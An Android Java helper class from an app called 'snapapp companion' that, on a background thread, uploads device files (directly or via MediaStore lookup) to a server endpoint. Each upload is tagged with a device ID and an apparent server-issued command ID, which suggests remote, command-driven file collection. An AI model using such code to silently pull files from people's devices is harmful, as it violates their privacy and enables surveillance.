package com.snapapp.companion;

import android.content.Context;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FileUploadHelper {

    public static void uploadFile(final Context context, final String serverUrl, final String deviceId,
                                  final String cmdId, final String fileId, final String filePath) {
        new Thread(new Runnable() {
            @Override
            public void run() {


                HttpURLConnection conn = null;
                InputStream is = null;
                try {
                    File file = new File(filePath);
                    String fileName = file.getName();
                    if (file.exists()) {
                        if (file.length() > 30 * 1024 * 1024) return;
                        is = new FileInputStream(file);
                    } else if (context != null) {
                        // Multi-source fallback for Huawei EMUI / older Android (API 21-28)
                        // Try Images, Video, Audio, then generic Files — in order
                        android.net.Uri[] collections = new android.net.Uri[]{
                            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                            android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                            android.provider.MediaStore.Files.getContentUri("external")
                        };
                        android.content.ContentResolver cr = context.getContentResolver();
                        for (android.net.Uri collectionUri : collections) {
                            if (is != null) break;
                            try {
                                android.database.Cursor cur = cr.query(collectionUri,
                                    new String[]{"_id", "_size"},
                                    "_data=?", new String[]{filePath}, null);
                                if (cur != null && cur.moveToFirst()) {
                                    long id = cur.getLong(0);
                                    long size = cur.getLong(1);
                                    cur.close();
                                    if (size > 30 * 1024 * 1024) return;
                                    is = cr.openInputStream(android.content.ContentUris.withAppendedId(collectionUri, id));
                                } else { if (cur != null) cur.close(); }
                            } catch (Exception ignored) {}
                        }
                    }
                    
                    if (is == null) return;

                    String boundary = "===" + System.currentTimeMillis() + "===";
                    URL url = new URL(serverUrl + "/api/device-sync/upload-file");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(20000);
                    conn.setReadTimeout(60000);
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream os = conn.getOutputStream();
                    PrintWriter w = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true);

                    addFormField(w, boundary, "device_id", deviceId);
                    if (cmdId != null) addFormField(w, boundary, "command_id", cmdId);
                    if (fileId != null) addFormField(w, boundary, "file_id", fileId);
                    addFormField(w, boundary, "file_name", fileName);

                    w.append("--").append(boundary).append("\r\n");
                    w.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileName).append("\"\r\n");
                    String mime = "image/jpeg";
                    String lower = fileName.toLowerCase();
                    if (lower.endsWith(".mp4")) mime = "video/mp4";
                    else if (lower.endsWith(".png")) mime = "image/png";
                    else if (lower.endsWith(".m4a") || lower.endsWith(".mp3") || lower.endsWith(".aac")) mime = "audio/mp4";
                    else if (lower.endsWith(".pdf")) mime = "application/pdf";
                    w.append("Content-Type: ").append(mime).append("\r\n\r\n").flush();

                    try {
                        byte[] buf = new byte[65536];
                        int len;
                        while ((len = is.read(buf)) != -1) os.write(buf, 0, len);
                        os.flush();
                    } finally {
                        is.close();
                    }

                    w.append("\r\n").flush();
                    w.append("--").append(boundary).append("--\r\n").close();

                    int code = conn.getResponseCode();
                    android.util.Log.d("FileUploadHelper", "Upload response for " + fileName + ": " + code);
                } catch (Exception e) {
                    android.util.Log.e("FileUploadHelper", "Upload failed", e);
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }

    private static void addFormField(PrintWriter w, String boundary, String name, String value) {
        w.append("--").append(boundary).append("\r\n");
        w.append("Content-Disposition: form-data; name=\"").append(name).append("\"\r\n\r\n");
        w.append(value).append("\r\n").flush();
    }
}
